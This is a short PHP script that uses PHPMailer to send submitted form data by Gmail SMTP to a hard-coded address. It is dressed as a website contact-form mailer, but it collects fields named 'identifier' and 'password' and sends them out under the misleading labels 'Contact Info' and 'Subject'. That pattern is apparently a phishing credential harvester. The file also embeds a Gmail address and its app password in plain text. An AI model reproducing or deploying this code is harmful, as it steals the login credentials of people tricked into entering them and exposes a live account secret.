<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if(isset($_POST["send"])){
    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'nellyfancii@gmail.com'; // Your email
        $mail->Password = 'dpep lcok rins jfax'; // Your app password
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->setFrom('nellyfancii@gmail.com'); // Your email
        $mail->addAddress('nellyfancii@gmail.com'); // Where you want to receive the messages

        $mail->isHTML(true);

        // Prepare the email content
        $subject = "New message from website";
        $body = "Contact Info: " . $_POST["identifier"] . "<br>";
        $body .= "Subject: " . $_POST["password"] . "<br>";
        // $body .= "Message: " . $_POST["message"];

        $mail->Subject = $subject;
        $mail->Body = $body;

        $mail->send();
        echo "<script>alert('Message sent successfully'); document.location.href = 'index.php';</script>";
    } catch (Exception $e) {
        echo "<script>alert('Message could not be sent. Mailer Error: {$mail->ErrorInfo}');</script>";
    }
}
?>